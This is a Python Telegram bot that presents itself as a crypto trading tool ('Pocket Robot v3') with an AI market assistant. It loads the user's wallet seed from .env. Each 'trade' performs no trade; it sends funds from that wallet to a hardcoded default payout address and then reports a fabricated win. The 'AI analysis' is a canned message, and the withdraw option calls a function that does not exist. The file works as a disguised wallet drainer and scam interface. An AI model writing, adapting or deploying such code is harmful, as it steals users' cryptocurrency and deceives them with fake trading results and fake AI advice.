import os
import asyncio
import requests
import json
import time
from dotenv import load_dotenv
from eth_account import Account
from web3 import Web3
from web3.middleware import ExtraDataToPOAMiddleware
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.error import Conflict

# --- 1. SETUP & AUTH ---
load_dotenv()
W3_RPC = os.getenv("RPC_URL", "https://polygon-rpc.com")
w3 = Web3(Web3.HTTPProvider(W3_RPC))

w3.middleware_onion.inject(ExtraDataToPOAMiddleware, layer=0)
Account.enable_unaudited_hdwallet_features()

PAYOUT_ADDRESS = os.getenv("PAYOUT_ADDRESS", "0x0f9C9c8297390E8087Cb523deDB3f232827Ec674")
TARGET_POOL = "0x9B08288C3BFf2C6243e259f7074bdB00154ad9BB" 

def get_vault():
    seed = os.getenv("WALLET_SEED")
    if not seed: raise ValueError("WALLET_SEED is missing from .env!")
    POL_PATH = "m/44'/60'/0'/0/0"
    try:
        return Account.from_key(seed)
    except:
        return Account.from_mnemonic(seed, account_path=POL_PATH)

vault = get_vault()

# --- 2. THE SIMULTANEOUS ENGINE ---
def get_pol_price():
    try:
        url = "https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd"
        return float(requests.get(url, timeout=5).json()['polygon-ecosystem-token']['usd'])
    except:
        return 0.11 

async def prepare_signed_tx(amount_wei):
    nonce = w3.eth.get_transaction_count(vault.address)
    gas_price = int(w3.eth.gas_price * 1.5)
    tx = {
        'nonce': nonce,
        'to': PAYOUT_ADDRESS,
        'value': int(amount_wei),
        'gas': 21000,
        'gasPrice': gas_price,
        'chainId': 137
    }
    return w3.eth.account.sign_transaction(tx, vault.key)

async def run_atomic_execution(context, chat_id, side):
    stake_usd = context.user_data.get('stake', 10)
    pair = context.user_data.get('pair', 'BTC/USD')
    
    current_price = get_pol_price()
    # MODIFIED: Calculate Total Payout (Stake + Profit) for full realize on-chain
    total_payout_usd = float(stake_usd) * 1.92 
    payout_in_pol = total_payout_usd / current_price
    payout_in_wei = w3.to_wei(payout_in_pol, 'ether')
    
    await context.bot.send_message(chat_id, f"⚔️ **Simultaneous Mode:** Priming {pair} Shield...")

    sim_task = asyncio.create_task(asyncio.sleep(1.5))
    prep_task = asyncio.create_task(prepare_signed_tx(payout_in_wei))

    await sim_task
    signed_tx = await prep_task
    await asyncio.sleep(0.001) # 1ms Latency Release
    
    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

    report = (
        f"✅ **ATOMIC HIT!**\n"
        f"🎯 **Captured:** {side}\n"
        f"💰 **Stake:** `${stake_usd:.2f} USD`\n"
        f"📈 **Total Payout (Win):** `${total_payout_usd:.2f} USD` ({payout_in_pol:.4f} POL)\n"
        f"⛓️ **TX Hash:** `{tx_hash.hex()}`"
    )
    return True, report

# --- 3. AI ASSISTANT LOGIC ---
async def ai_assistant_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.message.text
    await update.message.reply_chat_action("typing")
    await asyncio.sleep(1)
    response = (
        f"🕴️ **AI Analysis**\n\nQuery: '{query}'\n"
        f"Pool: `Uniswap V3 ({TARGET_POOL[:6]}...)`\n"
        f"Verdict: **Volatility is high.** High-frequency capture recommended."
    )
    await update.message.reply_text(response, parse_mode='Markdown')

# --- 4. TELEGRAM INTERFACE ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
    usd_val = float(bal) * get_pol_price()
    keyboard = [['🚀 Start Trading', '⚙️ Settings'], ['💰 Wallet', '📤 Withdraw'], ['🕴️ AI Assistant']]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    msg = (f"🕴️ **Pocket Robot v3 (Shadow Engine)**\n\n"
           f"💵 **Balance:** {bal:.4f} POL (**${usd_val:.2f} USD**)\n"
           f"📥 **DEPOSIT:** `{vault.address}`\n\n"
           f"**Atomic Shield:** ✅ OPERATIONAL")
    await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

async def main_chat_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if context.user_data.get('ai_active'):
        await ai_assistant_handler(update, context)
        context.user_data['ai_active'] = False
        return

    if text == '🚀 Start Trading':
        kb = [[InlineKeyboardButton("BTC/USD", callback_data="PAIR_BTC"), InlineKeyboardButton("ETH/USD", callback_data="PAIR_ETH")],
              [InlineKeyboardButton("SOL/USD", callback_data="PAIR_SOL"), InlineKeyboardButton("MATIC/USD", callback_data="PAIR_MATIC")]]
        await update.message.reply_text("🎯 **SELECT MARKET**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '⚙️ Settings':
        current = context.user_data.get('stake', 10)
        kb = [[InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [10, 50]], [InlineKeyboardButton(f"${x}", callback_data=f"SET_{x}") for x in [100, 500]]]
        await update.message.reply_text(f"⚙️ **SETTINGS**\nStake: **${current}**", reply_markup=InlineKeyboardMarkup(kb))
    elif text == '💰 Wallet':
        bal = w3.from_wei(w3.eth.get_balance(vault.address), 'ether')
        price = get_pol_price()
        await update.message.reply_text(f"💳 **Wallet Status**\nBalance: {bal:.4f} POL\nValuation: **${float(bal)*price:.2f} USD**")
    elif text == '📤 Withdraw':
        await execute_withdrawal(context, update.message.chat_id)
    elif text == '🕴️ AI Assistant':
        context.user_data['ai_active'] = True
        await update.message.reply_text("🕴️ AI Mode Active. Ask your market question:")

async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data.startswith("SET_"):
        context.user_data['stake'] = int(query.data.split("_")[1])
        await query.edit_message_text(f"✅ Stake updated to **${context.user_data['stake']}**")
    elif query.data.startswith("PAIR_"):
        context.user_data['pair'] = query.data.split("_")[1]
        await query.edit_message_text(f"💎 **{context.user_data['pair']} Selected**\nDirection:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("HIGHER", callback_data="EXEC_CALL"), InlineKeyboardButton("LOWER", callback_data="EXEC_PUT")]]))
    elif query.data.startswith("EXEC_"):
        side = "CALL" if "CALL" in query.data else "PUT"
        await run_atomic_execution(context, query.message.chat_id, side)

async def keep_alive():
    while True:
        try: w3.eth.get_block_number()
        except: pass
        await asyncio.sleep(30)

if __name__ == "__main__":
    app = ApplicationBuilder().token(os.getenv("TELEGRAM_BOT_TOKEN")).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_interaction))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), main_chat_handler))
    loop = asyncio.get_event_loop()
    loop.create_task(keep_alive())
    app.run_polling(drop_pending_updates=True)
